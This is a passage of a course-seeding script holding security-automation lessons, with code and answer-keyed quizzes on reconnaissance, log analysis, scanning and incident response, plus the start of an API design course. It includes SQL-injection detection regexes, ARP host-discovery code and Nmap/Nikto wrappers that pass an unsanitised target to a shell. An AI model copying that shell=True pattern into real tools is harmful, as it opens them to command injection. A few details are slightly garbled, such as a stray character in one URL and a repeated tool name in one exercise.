        hosts.append(rcv.psrc)
    return hosts

live_hosts = discover_hosts("192.168.1.0/24")
\`\`\`

### Section 2: Service Enumeration

After discovering live hosts, enumerate running services. Banner grabbing identifies service versions. HTTP header analysis reveals web server software. DNS enumeration finds subdomains.

### Section 3: OS Fingerprinting

TCP/IP stack fingerprinting identifies operating systems. TTL values, window sizes, and TCP options vary between OS implementations. P0f and similar tools automate OS detection.

### Section 4: Automated Reconnaissance

Combine discovery, enumeration, and fingerprinting into automated tools. Schedule scans. Generate structured reports. Integrate with vulnerability databases.

### Hands-On Practice

1. Build a network host discovery tool using ARP requests.
2. Implement a service enumeration script that grabs banners from open ports.
3. Create an automated reconnaissance pipeline that discovers, enumerates, and reports.

### Key Takeaways

- Different discovery methods work in different network environments
- Banner grabbing reveals service versions for vulnerability matching
- OS fingerprinting aids in vulnerability research
- Automated reconnaissance scales security assessments

### References

- Nmap: https://nmap.org/
- Scapy Documentation: https://scapy.readthedocs.io/
- OS Fingerprinting: https://p0f蛛.blogspot.com/`,
            questions: [
              { text: 'What is ARP scanning used for?', answers: [{ text: 'Discovering live hosts on a local network', isCorrect: true }, { text: 'Scanning remote networks', isCorrect: false }, { text: 'Encrypting network traffic', isCorrect: false }, { text: 'Managing DNS records', isCorrect: false }] },
              { text: 'What does banner grabbing reveal?', answers: [{ text: 'Service versions running on open ports', isCorrect: true }, { text: 'Network bandwidth', isCorrect: false }, { text: 'User passwords', isCorrect: false }, { text: 'Encryption keys', isCorrect: false }] },
              { text: 'How does OS fingerprinting work?', answers: [{ text: 'Analyzing TCP/IP stack differences between OS implementations', isCorrect: true }, { text: 'Checking MAC address only', isCorrect: false }, { text: 'Reading system registry', isCorrect: false }, { text: 'Checking installed software', isCorrect: false }] },
              { text: 'Why automate reconnaissance?', answers: [{ text: 'Scale security assessments to cover large networks efficiently', isCorrect: true }, { text: 'Reduce need for security knowledge', isCorrect: false }, { text: 'Eliminate manual testing entirely', isCorrect: false }, { text: 'Replace vulnerability scanning', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Security Automation',
        order: 3,
        lessons: [
          {
            title: 'Log Analysis & Monitoring',
            order: 1,
            content: `# Log Analysis & Monitoring

### Learning Objectives

- Parse and analyze security logs programmatically
- Detect suspicious patterns and anomalies
- Build automated alerting systems
- Create forensic analysis scripts

### Section 1: Log Parsing

Security logs contain valuable forensic data. Python parses various log formats: syslog, Apache access logs, Windows event logs, and custom application logs. Regular expressions extract specific patterns.

\`\`\`python
import re
from collections import Counter

# Parse Apache access log
log_pattern = r'(\d+\.\d+\.\d+\.\d+) - - \[(.*?)\] "(.*?)" (\d+) (\d+)'

def parse_apache_log(filepath):
    entries = []
    with open(filepath, 'r') as f:
        for line in f:
            match = re.match(log_pattern, line)
            if match:
                entries.append({
                    'ip': match.group(1),
                    'timestamp': match.group(2),
                    'request': match.group(3),
                    'status': int(match.group(4)),
                    'size': int(match.group(5))
                })
    return entries
\`\`\`

### Section 2: Pattern Detection

Identify attack patterns in log data. SQL injection attempts, directory traversal, brute force attacks, and port scanning leave signatures in logs. Rule-based detection flags known attack patterns.

\`\`\`python
# Detect SQL injection attempts
sqli_patterns = [
    r"union\\s+select",
    r"or\\s+1\\s*=\\s*1",
    r"drop\\s+table",
    r"'\\s*or\\s*'"
]

def detect_sqli(log_entries):
    attacks = []
    for entry in log_entries:
        request = entry['request'].lower()
        for pattern in sqli_patterns:
            if re.search(pattern, request, re.IGNORECASE):
                attacks.append(entry)
                break
    return attacks
\`\`\`

### Section 3: Anomaly Detection

Statistical analysis identifies unusual patterns. Baseline normal behavior and flag deviations. Threshold-based alerts for sudden spikes. Time-series analysis for temporal patterns.

### Section 4: Alerting Systems

Build automated alerting for suspicious activity. Email alerts, Slack notifications, and SIEM integration. Alert correlation reduces false positives. Escalation procedures ensure timely response.

### Hands-On Practice

1. Write a log analyzer that detects brute force login attempts.
2. Build a real-time log monitor that alerts on suspicious patterns.
3. Create an anomaly detection system that baselines normal traffic and alerts on deviations.

### Key Takeaways

- Regular expressions enable flexible log pattern matching
- Rule-based detection identifies known attack patterns
- Anomaly detection finds unknown threats through baseline comparison
- Automated alerting enables rapid incident response

### References

- Python Regular Expressions: https://docs.python.org/3/library/re.html
- Log Analysis: https://www.sans.org/white-papers/log-analysis/
- Security Monitoring: https://www.sans.org/reading-room/whitepapers/monitoring/`,
            questions: [
              { text: 'What is the first step in log analysis?', answers: [{ text: 'Parsing logs into structured data for analysis', isCorrect: true }, { text: 'Deleting old logs', isCorrect: false }, { text: 'Encrypting log files', isCorrect: false }, { text: 'Compressing log archives', isCorrect: false }] },
              { text: 'How do you detect SQL injection in logs?', answers: [{ text: 'Pattern matching with regular expressions for known attack signatures', isCorrect: true }, { text: 'Checking file sizes only', isCorrect: false }, { text: 'Looking for IP addresses only', isCorrect: false }, { text: 'Counting total log entries', isCorrect: false }] },
              { text: 'What is anomaly detection?', answers: [{ text: 'Identifying unusual patterns by comparing against baseline behavior', isCorrect: true }, { text: 'Detecting only known attack patterns', isCorrect: false }, { text: 'Compressing log files', isCorrect: false }, { text: 'Encrypting sensitive data', isCorrect: false }] },
              { text: 'Why is alert correlation important?', answers: [{ text: 'Reduces false positives by combining related alerts', isCorrect: true }, { text: 'Increases alert volume', isCorrect: false }, { text: 'Slows down detection', isCorrect: false }, { text: 'Requires more storage', isCorrect: false }] },
            ],
          },
          {
            title: 'Vulnerability Scanning Scripts',
            order: 2,
            content: `# Vulnerability Scanning Scripts

### Learning Objectives

- Build custom vulnerability scanners in Python
- Integrate with CVE databases for vulnerability matching
- Implement safe, non-destructive scanning techniques
- Generate vulnerability reports with remediation guidance

### Section 1: Scanner Architecture

Build modular vulnerability scanners. Separate discovery, enumeration, and vulnerability checking phases. Use classes to organize scanner components. Implement logging and error handling.

\`\`\`python
class VulnerabilityScanner:
    def __init__(self, targets):
        self.targets = targets
        self.results = []

    def discover(self):
        for target in self.targets:
            host = Host(target)
            host.discover_services()
            self.results.append(host)

    def check_vulnerabilities(self):
        for host in self.results:
            for service in host.services:
                vulns = self.check_service(service)
                host.vulnerabilities.extend(vulns)

    def generate_report(self):
        report = Report(self.results)
        report.export_json('vulnerability_report.json')
\`\`\`

### Section 2: CVE Integration

Match detected services against known vulnerabilities. Query CVE databases using service name and version. NIST NVD API provides CVE data. Build local caches for offline scanning.

\`\`\`python
import requests

def query_cve(service, version):
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {
        "keywordSearch": f"{service} {version}",
        "resultsPerPage": 10
    }
    response = requests.get(url, params=params)
    return response.json().get('vulnerabilities', [])
\`\`\`

### Section 3: Safe Scanning Practices

Avoid denial-of-service conditions. Implement rate limiting. Respect target systems. Scan during authorized windows. Log all scanning activity. Never modify target systems.

### Section 4: Report Generation

Generate actionable vulnerability reports. Include severity ratings (CVSS). Provide remediation guidance. Track remediation progress. Export in multiple formats.

### Hands-On Practice

1. Build a vulnerability scanner that checks for common web vulnerabilities.
2. Integrate with NIST NVD API for CVE matching.
3. Create a report generator that produces HTML vulnerability reports with severity ratings.

### Key Takeaways

- Modular architecture enables scanner maintenance and extension
- CVE databases provide known vulnerability information
- Safe scanning prevents unintended disruption
- Actionable reports enable effective remediation

### References

- NIST NVD API: https://nvd.nist.gov/developers/vulnerabilities
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CVE Standard: https://cve.mitre.org/`,
            questions: [
              { text: 'What is the most important principle for vulnerability scanning?', answers: [{ text: 'Safe, non-destructive scanning that avoids disrupting target systems', isCorrect: true }, { text: 'Scanning as fast as possible', isCorrect: false }, { text: 'Scanning all ports simultaneously', isCorrect: false }, { text: 'Modifying target systems during scan', isCorrect: false }] },
              { text: 'What does CVE matching identify?', answers: [{ text: 'Known vulnerabilities associated with detected service versions', isCorrect: true }, { text: 'New zero-day vulnerabilities', isCorrect: false }, { text: 'Network topology only', isCorrect: false }, { text: 'User credentials', isCorrect: false }] },
              { text: 'What should vulnerability reports include?', answers: [{ text: 'Severity ratings, remediation guidance, and affected systems', isCorrect: true }, { text: 'Only list of affected IP addresses', isCorrect: false }, { text: 'Only network diagrams', isCorrect: false }, { text: 'Only source code', isCorrect: false }] },
              { text: 'Why implement rate limiting in scanners?', answers: [{ text: 'Prevent denial-of-service conditions on target systems', isCorrect: true }, { text: 'Speed up scanning process', isCorrect: false }, { text: 'Reduce report size', isCorrect: false }, { text: 'Improve accuracy', isCorrect: false }] },
            ],
          },
          {
            title: 'Incident Response Automation',
            order: 3,
            content: `# Incident Response Automation

### Learning Objectives

- Automate incident detection and triage
- Build automated containment and response scripts
- Implement forensic data collection automation
- Create post-incident analysis workflows

### Section 1: Detection Automation

Automated detection monitors for indicators of compromise (IOCs). Combine log analysis, network monitoring, and threat intelligence feeds. Correlate events across multiple data sources.

\`\`\`python
class IncidentDetector:
    def __init__(self):
        self.iocs = self.load_iocs()
        self.rules = self.load_detection_rules()

    def analyze_event(self, event):
        alerts = []
        # Check against IOCs
        if self.check_iocs(event):
            alerts.append(Alert('IOC_MATCH', event, 'HIGH'))
        # Check detection rules
        for rule in self.rules:
            if rule.matches(event):
                alerts.append(Alert(rule.name, event, rule.severity))
        return alerts

    def process_alerts(self, alerts):
        for alert in alerts:
            if alert.severity == 'CRITICAL':
                self.trigger_automated_response(alert)
\`\`\`

### Section 2: Automated Containment

When incidents are confirmed, automated containment limits damage. Isolate compromised hosts from the network. Block malicious IP addresses. Disable compromised user accounts. All actions should be logged and reversible.

### Section 3: Forensic Collection

Automate evidence collection to preserve volatile data. Capture memory dumps, network connections, running processes, and file system artifacts. Maintain chain of custody documentation.

### Section 4: Post-Incident Analysis

Automate post-incident metrics collection. Calculate mean time to detect (MTTD) and mean time to respond (MTTR). Generate incident timelines. Identify improvement opportunities.

### Hands-On Practice

1. Build an automated IOC checker that monitors log feeds for known indicators.
2. Create a containment script that isolates a compromised host from the network.
3. Develop a forensic collection tool that gathers volatile evidence automatically.

### Key Takeaways

- Automated detection reduces response time
- Containment automation limits incident damage
- Automated forensic collection preserves evidence integrity
- Post-incident metrics drive continuous improvement

### References

- SANS Incident Response: https://www.sans.org/white-papers/incident-handling/
- NIST IR Guide: https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final
- Forensics: https://www.sans.org/white-papers/computer-forensics/`,
            questions: [
              { text: 'What is the first step in incident response automation?', answers: [{ text: 'Automated detection using IOCs and correlation rules', isCorrect: true }, { text: 'Automated system recovery', isCorrect: false }, { text: 'Automated user notification', isCorrect: false }, { text: 'Automated backup deletion', isCorrect: false }] },
              { text: 'What does automated containment do?', answers: [{ text: 'Limits incident damage by isolating compromised systems', isCorrect: true }, { text: 'Increases system availability', isCorrect: false }, { text: 'Speeds up network connections', isCorrect: false }, { text: 'Reduces storage costs', isCorrect: false }] },
              { text: 'Why automate forensic evidence collection?', answers: [{ text: 'Preserves volatile evidence before it is lost', isCorrect: true }, { text: 'Reduces evidence accuracy', isCorrect: false }, { text: 'Eliminates need for analysis', isCorrect: false }, { text: 'Increases incident duration', isCorrect: false }] },
              { text: 'What metrics does post-incident analysis track?', answers: [{ text: 'Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR)', isCorrect: true }, { text: 'Only total number of incidents', isCorrect: false }, { text: 'Only server uptime', isCorrect: false }, { text: 'Only employee satisfaction', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Building Security Tools',
        order: 4,
        lessons: [
          {
            title: 'Custom Exploit Development',
            order: 1,
            content: `# Custom Exploit Development

### Learning Objectives

- Understand responsible exploit development
- Build proof-of-concept exploits for known vulnerabilities
- Implement buffer overflow detection and analysis
- Practice exploit development ethically

### Section 1: Exploit Development Fundamentals

Exploit development is the practice of creating code that demonstrates vulnerability impact. It is essential for understanding attack vectors and building effective defenses. Always practice in authorized lab environments.

### Section 2: Buffer Overflow Analysis

Buffer overflows occur when programs write beyond allocated memory. Understanding stack layout, return addresses, and shellcode injection is fundamental to memory corruption analysis.

\`\`\`python
# Simple buffer overflow detection pattern
def generate_pattern(length):
    pattern = ""
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(length):
        pattern += chars[i // 26 % 26] + chars[i % 26]
    return pattern[:length]

# Analyze crash dump for offset
def find_offset(crash_value):
    for i in range(10000):
        test_pattern = generate_pattern(i)
        if test_pattern.encode()[:4] == crash_value:
            return i
    return None
\`\`\`

### Section 3: Shellcode Analysis

Analyze shellcode to understand exploit payloads. Disassemble shellcode to identify system calls and functionality. Build shellcode analysis tools.

### Section 4: Exploit Mitigation

Understanding exploit mitigations (DEP, ASLR, stack canaries) is essential for both offense and defense. Modern systems implement multiple layers of protection.

### Hands-On Practice

1. Analyze a sample buffer overflow vulnerability in a controlled lab environment.
2. Build a shellcode analyzer that identifies system calls.
3. Document findings and develop defensive recommendations.

### Key Takeaways

- Exploit development must be practiced ethically in authorized environments
- Buffer overflow analysis reveals memory corruption vulnerabilities
- Shellcode analysis identifies exploit payload functionality
- Understanding mitigations is essential for both offense and defense

### References

- Exploit Development: https://www.corelan.be/
- Shell-Storm: http://shell-storm.org/
- Exploit Database: https://www.exploit-db.com/`,
            questions: [
              { text: 'Where should exploit development be practiced?', answers: [{ text: 'Only in authorized lab environments', isCorrect: true }, { text: 'On production systems', isCorrect: false }, { text: 'On random internet systems', isCorrect: false }, { text: 'Without authorization', isCorrect: false }] },
              { text: 'What causes a buffer overflow?', answers: [{ text: 'Writing beyond allocated memory boundaries', isCorrect: true }, { text: 'Reading from empty files', isCorrect: false }, { text: 'Connecting to remote servers', isCorrect: false }, { text: 'Running normal applications', isCorrect: false }] },
              { text: 'What does shellcode analysis reveal?', answers: [{ text: 'The functionality and system calls of exploit payloads', isCorrect: true }, { text: 'Network configuration', isCorrect: false }, { text: 'User passwords', isCorrect: false }, { text: 'Encryption keys', isCorrect: false }] },
              { text: 'Why understand exploit mitigations?', answers: [{ text: 'Essential for both offensive testing and defensive security', isCorrect: true }, { text: 'Only for offensive purposes', isCorrect: false }, { text: 'To bypass all security', isCorrect: false }, { text: 'Not relevant to security', isCorrect: false }] },
            ],
          },
          {
            title: 'Security Tool Integration',
            order: 2,
            content: `# Security Tool Integration

### Learning Objectives

- Integrate existing security tools into Python workflows
- Build orchestration scripts for multiple tools
- Automate security assessment pipelines
- Create custom tool interfaces

### Section 1: Tool Integration Patterns

Security tools produce output in various formats. Parse and normalize outputs for unified analysis. Build adapters that convert between tool-specific formats.

\`\`\`python
import subprocess
import json

class NmapScanner:
    def scan(self, target, ports="1-1000"):
        cmd = f"nmap -sV -oX - {target} -p {ports}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return self.parse_xml(result.stdout)

    def parse_xml(self, xml_output):
        # Parse nmap XML output
        import xml.etree.ElementTree as ET
        root = ET.fromstring(xml_output)
        hosts = []
        for host in root.findall('host'):
            hosts.append(self._parse_host(host))
        return hosts

class NiktoScanner:
    def scan(self, target):
        cmd = f"nikto -h {target} -Format json -output -"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return json.loads(result.stdout)
\`\`\`

### Section 2: Pipeline Orchestration

Chain multiple tools into automated pipelines. Nmap discovery feeds Nikto web scanning feeds Metasploit exploitation. Manage tool dependencies and error handling.

### Section 3: Output Normalization

Convert tool-specific outputs to common formats. STIX/TAXII for threat intelligence. Common Vulnerability Scoring System (CVSS) for severity. Normalized data enables cross-tool correlation.

### Section 4: Custom Tool Interfaces

Build Python interfaces for tools that lack APIs. Wrap command-line tools with Python classes. Provide consistent error handling and logging across tools.

### Hands-On Practice

1. Build an orchestrator that runs nmap, nikto, and nikto in sequence.
2. Create output normalizers that convert tool outputs to common JSON format.
3. Build a Python wrapper for a command-line security tool.

### Key Takeaways

- Tool integration multiplies security assessment capabilities
- Pipeline orchestration automates complex assessment workflows
- Output normalization enables cross-tool correlation
- Custom interfaces provide consistent tool management

### References

- Nmap: https://nmap.org/
- Nikto: https://cirt.net/Nikto2
- Metasploit: https://www.metasploit.com/`,
            questions: [
              { text: 'Why integrate multiple security tools?', answers: [{ text: 'Each tool provides unique capabilities that complement each other', isCorrect: true }, { text: 'To reduce the number of tools needed', isCorrect: false }, { text: 'To make scanning slower', isCorrect: false }, { text: 'To increase false positives', isCorrect: false }] },
              { text: 'What does output normalization provide?', answers: [{ text: 'Common format enabling cross-tool data correlation', isCorrect: true }, { text: 'Faster scanning speeds', isCorrect: false }, { text: 'Smaller output files', isCorrect: false }, { text: 'Better encryption', isCorrect: false }] },
              { text: 'What is pipeline orchestration?', answers: [{ text: 'Chaining multiple tools into automated assessment workflows', isCorrect: true }, { text: 'Running tools manually one at a time', isCorrect: false }, { text: 'Using only one tool per assessment', isCorrect: false }, { text: 'Writing reports manually', isCorrect: false }] },
              { text: 'What do tool adapters provide?', answers: [{ text: 'Convert between tool-specific output formats for unified analysis', isCorrect: true }, { text: 'Replace existing security tools', isCorrect: false }, { text: 'Speed up network connections', isCorrect: false }, { text: 'Encrypt tool outputs', isCorrect: false }] },
            ],
          },
          {
            title: 'Tool Deployment & Packaging',
            order: 3,
            content: `# Tool Deployment & Packaging

### Learning Objectives

- Package Python security tools for distribution
- Create command-line interfaces with Click or argparse
- Build Docker containers for tool deployment
- Implement tool configuration management

### Section 1: CLI Tool Design

Build intuitive command-line interfaces. Click and argparse provide argument parsing, help generation, and validation. Design consistent CLI patterns across tools.

\`\`\`python
import click

@click.command()
@click.option('--target', '-t', required=True, help='Target IP or hostname')
@click.option('--ports', '-p', default='1-1000', help='Port range to scan')
@click.option('--output', '-o', default='results.json', help='Output file')
@click.option('--verbose', '-v', is_flag=True, help='Enable verbose output')
def scan(target, ports, output, verbose):
    """Network vulnerability scanner."""
    if verbose:
        click.echo(f'Scanning {target} ports {ports}...')

    scanner = VulnerabilityScanner(target, ports)
    results = scanner.scan()

    with open(output, 'w') as f:
        json.dump(results, f, indent=2)

    click.echo(f'Scan complete. Results saved to {output}')

if __name__ == '__main__':
    scan()
\`\`\`

### Section 2: Packaging with setuptools

Package tools as installable Python packages. setup.py or pyproject.toml defines dependencies and entry points. pip install makes tools available system-wide.

### Section 3: Docker Deployment

Containerize tools for consistent deployment. Docker images include all dependencies. Share images via registries. Support air-gapped environments.

\`\`\`dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
ENTRYPOINT ["python", "-m", "security_scanner"]
\`\`\`

### Section 4: Configuration Management

YAML or TOML configuration files. Environment-specific configs. Command-line overrides. Secure credential storage with keyrings or vaults.

### Hands-On Practice

1. Build a CLI security tool using Click with multiple options and subcommands.
2. Package the tool as an installable Python package.
3. Create a Docker image for the tool with proper configuration.

### Key Takeaways

- Consistent CLI patterns improve tool usability
- Python packaging enables easy tool distribution
- Docker provides consistent deployment environments
- Configuration management separates code from environment settings

### References

- Click: https://click.palletsprojects.com/
- Python Packaging: https://packaging.python.org/
- Docker: https://docs.docker.com/`,
            questions: [
              { text: 'What does Click provide for CLI tools?', answers: [{ text: 'Argument parsing, help generation, and input validation', isCorrect: true }, { text: 'Network scanning only', isCorrect: false }, { text: 'Database connections only', isCorrect: false }, { text: 'File encryption only', isCorrect: false }] },
              { text: 'Why containerize security tools?', answers: [{ text: 'Consistent deployment with all dependencies included', isCorrect: true }, { text: 'Make tools run faster', isCorrect: false }, { text: 'Reduce code size', isCorrect: false }, { text: 'Eliminate configuration', isCorrect: false }] },
              { text: 'What should configuration files separate?', answers: [{ text: 'Code from environment settings and credentials', isCorrect: true }, { text: 'Functions from classes', isCorrect: false }, { text: 'Tests from source code', isCorrect: false }, { text: 'Documentation from code', isCorrect: false }] },
              { text: 'What do entry points in setup.py define?', answers: [{ text: 'Command-line commands that invoke the packaged tool', isCorrect: true }, { text: 'Database connection strings', isCorrect: false }, { text: 'API endpoints', isCorrect: false }, { text: 'Test cases', isCorrect: false }] },
            ],
          },
          {
            title: 'Best Practices & Ethics',
            order: 4,
            content: `# Best Practices & Ethics

### Learning Objectives

- Follow ethical guidelines for security testing
- Implement proper authorization and scoping
- Document findings professionally
- Maintain responsible disclosure practices

### Section 1: Authorization & Scope

Never test systems without explicit written authorization. Define clear scope boundaries. Stay within authorized testing windows. Document all testing activities.

### Section 2: Responsible Disclosure

When vulnerabilities are found in third-party systems, follow responsible disclosure practices. Allow vendors time to fix issues before public disclosure. Coordinate disclosure timelines.

### Section 3: Professional Documentation

Document all testing activities, findings, and recommendations. Professional reports include executive summaries, technical details, and remediation guidance. Maintain chain of custody for evidence.

### Section 4: Legal Considerations

Understand the legal framework for security testing. CFAA, GDPR, and other regulations affect testing practices. Legal review of testing activities prevents liability.

### Hands-On Practice

1. Write a scope of work document for a penetration test.
2. Create a professional vulnerability report with executive summary.
3. Draft a responsible disclosure notification for a discovered vulnerability.

### Key Takeaways

- Authorization is mandatory before any security testing
- Responsible disclosure protects users while enabling fixes
- Professional documentation enables effective remediation
- Legal awareness prevents unauthorized testing liability

### References

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Responsible Disclosure: https://www.cert.org/
- Legal Guide: https://www.eff.org/`,
            questions: [
              { text: 'What is required before conducting security testing?', answers: [{ text: 'Explicit written authorization from the system owner', isCorrect: true }, { text: 'Verbal permission from a colleague', isCorrect: false }, { text: 'No permission needed for testing', isCorrect: false }, { text: 'Only management approval', isCorrect: false }] },
              { text: 'What is responsible disclosure?', answers: [{ text: 'Allowing vendors time to fix vulnerabilities before public disclosure', isCorrect: true }, { text: 'Publishing vulnerabilities immediately', isCorrect: false }, { text: 'Hiding vulnerabilities from vendors', isCorrect: false }, { text: 'Reporting only to law enforcement', isCorrect: false }] },
              { text: 'Why document all testing activities?', answers: [{ text: 'Provides accountability and enables effective remediation', isCorrect: true }, { text: 'Increases testing speed', isCorrect: false }, { text: 'Reduces report accuracy', isCorrect: false }, { text: 'Simplifies tool usage', isCorrect: false }] },
              { text: 'What legal risks exist for security testing?', answers: [{ text: 'Testing without authorization can violate CFAA and other laws', isCorrect: true }, { text: 'No legal risks exist for testing', isCorrect: false }, { text: 'Only risks for commercial tools', isCorrect: false }, { text: 'Only risks for government testing', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 6. API Design & Security
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'API Design & Security',
    'Comprehensive course on RESTful API design, authentication and authorization patterns, security testing, and API gateway implementation. Students will build secure, well-designed APIs from scratch.',
    30,
    [
      {
        title: 'RESTful API Design',
        order: 1,
        lessons: [
          {
            title: 'REST Principles & Resource Modeling',
            order: 1,
            content: `# REST Principles & Resource Modeling

### Learning Objectives

- Apply REST architectural constraints to API design
- Model resources and relationships effectively
- Design consistent URL structures and naming conventions
- Implement proper HTTP method semantics

### Section 1: REST Architectural Constraints

REST (Representational State Transfer) defines six architectural constraints: client-server, stateless, cacheable, uniform interface, layered system, and code on demand. These constraints enable scalable, maintainable APIs.

### Section 2: Resource Identification

Every resource needs a unique URI. Resources represent nouns, not verbs. Hierarchical URLs express relationships. Use plural nouns for collections and specific identifiers for individual resources.

\`\`\`
GET    /api/v1/users              # List all users
POST   /api/v1/users              # Create a user
GET    /api/v1/users/:id          # Get specific user
PUT    /api/v1/users/:id          # Replace user
DELETE /api/v1/users/:id          # Delete user
GET    /api/v1/users/:id/posts    # List user's posts
\`\`\`

### Section 3: HTTP Method Semantics

GET retrieves resources. POST creates resources. PUT replaces resources entirely. PATCH partially updates resources. DELETE removes resources. HEAD and OPTIONS for metadata. Use correct status codes.

### Section 4: Versioning Strategies

Version APIs to prevent breaking changes. URI versioning (/v1/), header versioning (Accept: application/vnd.api.v1+json), and query parameter versioning. URI versioning is simplest and most explicit.

### Hands-On Practice

1. Design a REST API for an e-commerce platform with products, orders, and users.
2. Define resource models with proper relationships and URL structures.
3. Document API endpoints with OpenAPI specification.

### Key Takeaways

- REST constraints enable scalable, maintainable APIs
- Resource modeling with proper nouns and relationships
- HTTP methods have specific semantic meanings
- Versioning prevents breaking changes for API consumers

### References

- REST API Design: https://restfulapi.net/
- OpenAPI Specification: https://swagger.io/specification/
- Microsoft REST API Guidelines: https://github.com/microsoft/api-guidelines`,
            questions: [
              { text: 'What do REST API URLs represent?', answers: [{ text: 'Nouns representing resources, not actions', isCorrect: true }, { text: 'Actions the API performs', isCorrect: false }, { text: 'Database table names only', isCorrect: false }, { text: 'Function names', isCorrect: false }] },
              { text: 'What HTTP method fully replaces a resource?', answers: [{ text: 'PUT', isCorrect: true }, { text: 'PATCH', isCorrect: false }, { text: 'POST', isCorrect: false }, { text: 'GET', isCorrect: false }] },
              { text: 'Why version REST APIs?', answers: [{ text: 'Prevent breaking changes for API consumers', isCorrect: true }, { text: 'Increase API performance', isCorrect: false }, { text: 'Reduce API complexity', isCorrect: false }, { text: 'Simplify authentication', isCorrect: false }] },
              { text: 'What is the most explicit versioning strategy?', answers: [{ text: 'URI versioning (/v1/)', isCorrect: true }, { text: 'Header versioning', isCorrect: false }, { text: 'Query parameter versioning', isCorrect: false }, { text: 'No versioning needed', isCorrect: false }] },
            ],
          },
          {
            title: 'Request/Response Design',
            order: 2,
            content: `# Request/Response Design

### Learning Objectives

- Design consistent request and response formats
- Implement pagination, filtering, and sorting
- Create meaningful error responses
- Use HATEOAS for API discoverability

### Section 1: Request Design

Consistent request formats reduce API consumer friction. JSON is the standard request format. Support content negotiation. Validate input with schemas. Use consistent parameter naming.

\`\`\`json
{
  "data": {
    "type": "users",
    "attributes": {
      "email": "user@example.com",
      "name": "John Doe",
      "role": "admin"
    }
  }
}
\`\`\`

### Section 2: Response Envelopes

Wrap responses in consistent envelopes. Include data, metadata, and links. Pagination metadata helps consumers navigate large datasets.

\`\`\`json
{
  "data": [...],
  "meta": {
    "total": 150,
    "page": 1,
    "perPage": 20,
    "totalPages": 8
  },
  "links": {
    "self": "/api/v1/users?page=1",
    "next": "/api/v1/users?page=2",
    "last": "/api/v1/users?page=8"
  }
}
\`\`\`

### Section 3: Error Responses

Consistent error responses help consumers handle failures. Include error code, message, and details. Use RFC 7807 Problem Details for HTTP APIs.

\`\`\`json
{
  "type": "https://api.example.com/errors/validation",
  "title": "Validation Error",
  "status": 422,
  "detail": "The request body contains invalid fields",
  "errors": [
    {
      "field": "email",
      "message": "Must be a valid email address"
    }
  ]
}
\`\`\`

### Section 4: Pagination Patterns

Offset-based pagination for simple cases. Cursor-based pagination for real-time data. Keyset pagination for large datasets. Each pattern has performance characteristics.

### Hands-On Practice

1. Design a consistent response envelope for an API.
2. Implement cursor-based pagination for a resource collection.
3. Create RFC 7807 compliant error responses.

### Key Takeaways

- Consistent request/response formats reduce consumer friction
- Pagination enables efficient data retrieval
- Standardized error responses help consumers handle failures
- Response envelopes provide metadata and navigation links

### References

- JSON API: https://jsonapi.org/
- RFC 7807: https://tools.ietf.org/html/rfc7807
- Pagination Patterns: https://microservices.io/patterns/`,
            questions: [
              { text: 'What does a response envelope provide?', answers: [{ text: 'Consistent wrapper with data, metadata, and navigation links', isCorrect: true }, { text: 'Larger response sizes only', isCorrect: false }, { text: 'Faster network transmission', isCorrect: false }, { text: 'Better encryption', isCorrect: false }] },
              { text: 'What is cursor-based pagination?', answers: [{ text: 'Using a pointer to navigate through large datasets efficiently', isCorrect: true }, { text: 'Using page numbers only', isCorrect: false }, { text: 'Returning all results at once', isCorrect: false }, { text: 'Using offset values only', isCorrect: false }] },
              { text: 'What standard defines error response format?', answers: [{ text: 'RFC 7807 Problem Details for HTTP APIs', isCorrect: true }, { text: 'HTTP/1.1 only', isCorrect: false }, { text: 'JSON Schema only', isCorrect: false }, { text: 'OAuth 2.0 only', isCorrect: false }] },
              { text: 'Why use consistent request formats?', answers: [{ text: 'Reduce API consumer friction and integration time', isCorrect: true }, { text: 'Increase API complexity', isCorrect: false }, { text: 'Reduce API features', isCorrect: false }, { text: 'Simplify server code', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Authentication & Authorization',
        order: 2,
        lessons: [
          {
            title: 'OAuth 2.0 Flows',
            order: 1,
            content: `# OAuth 2.0 Flows

### Learning Objectives

- Implement OAuth 2.0 authorization flows
- Choose appropriate grant types for different scenarios
- Understand token lifecycle and security
- Integrate with third-party OAuth providers

### Section 1: OAuth 2.0 Fundamentals

OAuth 2.0 is an authorization framework that enables third-party applications to obtain limited access to resources. It defines four roles: resource owner, client, authorization server, and resource server.

### Section 2: Authorization Code Flow

The most secure flow for server-side applications. Client redirects to authorization server, user authenticates and grants consent, authorization server returns code, client exchanges code for tokens.

\`\`\`
# Authorization Code Flow
1. Client redirects to authorization endpoint
   GET /authorize?
     response_type=code&
     client_id=CLIENT_ID&
     redirect_uri=https://app.example.com/callback&
     scope=read write&
     state=xyz123

2. User authenticates and grants consent

3. Authorization server redirects to callback
   GET /callback?code=AUTH_CODE&state=xyz123

4. Client exchanges code for tokens
   POST /token
   Content-Type: application/x-www-form-urlencoded

   grant_type=authorization_code&
   code=AUTH_CODE&
   client_id=CLIENT_ID&
   client_secret=CLIENT_SECRET&
   redirect_uri=https://app.example.com/callback
\`\`\`

### Section 3: Client Credentials Flow

Machine-to-machine authentication without user involvement. Client authenticates directly with client credentials. Used for service-to-service communication.

### Section 4: Token Management

Access tokens have short lifetimes. Refresh tokens enable persistent sessions. Token revocation for logout. Token introspection for validation. Secure token storage.

### Hands-On Practice

1. Implement the OAuth 2.0 Authorization Code flow.
2. Set up token refresh and revocation.
3. Integrate with a third-party OAuth provider.

### Key Takeaways

- Authorization Code flow is the most secure for web applications
- Client Credentials flow is for machine-to-machine authentication
- Token lifecycle management is essential for security
- Secure token storage prevents token theft

### References

- OAuth 2.0 RFC 6749: https://tools.ietf.org/html/rfc6749
